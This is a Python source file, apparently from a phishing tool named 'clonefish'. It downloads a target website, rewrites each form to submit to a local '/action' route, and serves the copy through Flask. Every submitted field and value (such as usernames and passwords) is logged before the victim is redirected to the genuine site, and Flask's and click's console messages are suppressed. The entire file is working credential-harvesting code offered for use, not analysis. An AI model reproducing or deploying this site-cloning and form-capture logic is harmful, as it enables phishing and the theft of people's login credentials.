
from clonefish.options import Options
from clonefish.utils import is_valid_url, throw_error

from bs4 import BeautifulSoup
from loguru import logger

from flask import Flask, request, redirect

import logging
import click

import requests

# TODO: inherit from a parent class called "Provider"
class ExternalProvider:
    options: Options
    def __init__(self, options: Options) -> None:
        self.options = options

    def execute(self):
        url = self.options.external_opts['url']
        if not is_valid_url(url):
            throw_error(f"'{url}' is not a valid URL!")

        logger.info(f"Fetching website contents from '{url }'")

        try:
            response = requests.get(url)
        except Exception as e:
            throw_error(f"found an error while fetching website: {e}")

        soup = BeautifulSoup(response.content, 'html.parser')
        for form in soup.find_all('form'):
            form['action'] = "/action"

        self.serve(str(soup), url)

    def serve(self, html: str, url: str):
        app = Flask(__name__)

        # ignore flask messages!
        log = logging.getLogger('werkzeug')
        log.disabled = True

        def secho(text, file=None, nl=None, err=None, color=None, **styles):
            pass

        def echo(text, file=None, nl=None, err=None, color=None, **styles):
            pass

        click.echo = echo
        click.secho = secho

        @app.route('/', defaults={'path': ''})
        @app.route('/<path:path>')
        def home(path: str):
            return html

        @app.route('/action', methods = ['POST'])
        def action():
            logger.info("-----------------")
            logger.info("new action has been triggered")

            for v in request.form:
                logger.info("  - %s : %s" % (v,request.form[v]))

            logger.info("-----------------")

            return redirect(url)

        host = "127.0.0.1"
        port = 3000

        logger.info(f"Application runing at: http://{host}:{port}")
        app.run(host=host, port=port)


